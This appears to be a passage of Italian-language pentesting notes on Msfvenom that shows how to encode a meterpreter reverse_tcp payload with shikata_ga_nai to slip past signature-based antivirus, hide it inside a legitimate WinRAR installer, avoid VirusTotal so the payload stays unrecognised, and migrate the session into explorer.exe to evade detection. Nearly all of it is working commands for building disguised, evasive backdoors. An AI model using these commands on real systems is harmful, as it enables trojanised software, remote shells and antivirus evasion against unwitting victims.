
## Encoding dei Payload

Gli **encoder** sono moduli di Msfvenom che permettono di **modificare il codice binario (shellcode)** di un payload per **alterarne la firma**. Questo può servire a eludere gli antivirus, specialmente quelli che usano il **rilevamento basato su firme**.
> Il **shellcode** è il nucleo del payload, una sequenza di istruzioni in linguaggio macchina che viene eseguita quando il payload è attivato. In un payload come `meterpreter`, il shellcode è responsabile dell’instaurazione della sessione con l’attaccante. <br> Codificando il shellcode con un encoder, ne cambiamo la forma binaria mantenendo inalterata la funzionalità.

Gli antivirus, infatti, memorizzano le firme note di file malevoli in un database: se un file coincide con una di queste firme, viene identificato come pericoloso. L’**encoding** serve quindi a **modificare il bytecode del payload**, mantenendone il comportamento ma cambiandone l’impronta digitale.

Per elencare tutti gli encoder disponibili:
```bash
msfvenom --list encoders
```

Ogni encoder è classificato con un rank (es. `excellent`, `good`, `normal`, `low`, `manual`) e include una breve descrizione.

Il più noto è:
- `x86/shikata_ga_nai` → un encoder polimorfico XOR che muta a ogni generazione, rendendo ogni payload leggermente diverso.

**Esempio di encoding con Msfvenom:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe > /tmp/payload_encoded.exe
```

- `-e` specifica l’encoder
- `-i` imposta il numero di iterazioni (più iterazioni → più variazioni nel bytecode)

> Si consiglia di **non caricare i payload su VirusTotal** o simili, poiché questi strumenti contribuiscono ad aggiornare i database degli antivirus, rendendo il tuo payload riconoscibile.

---

## Iniezione in File Legittimi

Puoi mascherare il payload dentro un programma reale (es. WinRAR):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 10 -f exe -x /path/to/winrar_setup.exe > /tmp/winrar_modificato.exe
```

- `-x` → file legittimo in cui iniettare
- `-k` → mantiene il comportamento originale del file

> `-k` funziona solo in alcuni casi e non è sempre affidabile: dipende da come il programma legittimo è strutturato.

---

## Post-Exploitation: Migrate

Dopo aver stabilito una sessione `meterpreter`, è consigliabile usare:
```bash
run post/windows/manage/migrate
```

Questo modulo migra il processo in uno stabile (es. `explorer.exe`), evitando crash e rilevamento.

---
